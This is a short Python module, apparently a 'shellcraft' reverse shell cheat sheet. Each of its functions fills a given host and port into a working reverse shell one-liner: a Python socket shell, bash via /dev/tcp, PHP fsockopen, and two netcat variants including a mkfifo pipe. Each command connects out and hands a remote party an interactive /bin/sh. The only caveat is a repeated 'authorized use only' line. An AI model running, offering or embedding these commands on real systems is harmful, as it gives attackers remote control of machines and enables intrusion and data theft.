### shellcraft module - reverse shell cheatsheet ###

def python_rev(lhost: str, lport: int):
    return '''
> please only use in an authorized setting... misuse is prohibited and not endorsed
```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{}",{}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
'''.format(lhost, lport)

def bash_rev(lhost: str, lport: int):
    return '''
> please only use in an authorized setting... misuse is prohibited and not endorsed
```bash
bash -i >& /dev/tcp/{}/{} 0>&1 &
```
'''.format(lhost, lport)

def php_rev(lhost: str, lport: int):
    return ''' 
(assumes tcp is on fd 3; if 3 doesn't work, go up 1)
> please only use in an authorized setting... misuse is prohibited and not endorsed
```bash
php -r '$sock=fsockopen("{}",{});exec("/bin/sh -i <&3 >&3 2>&3");'
```
'''.format(lhost, lport)

def nc_rev(lhost: str, lport: int):
    return '''
(version dependent; if one doesn't work try the other)
> please only use in an authorized setting... misuse is prohibited and not endorsed
```bash
nc -e /bin/sh {} {}
```
or

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {} {} >/tmp/f
```
'''.format(lhost, lport, lhost, lport)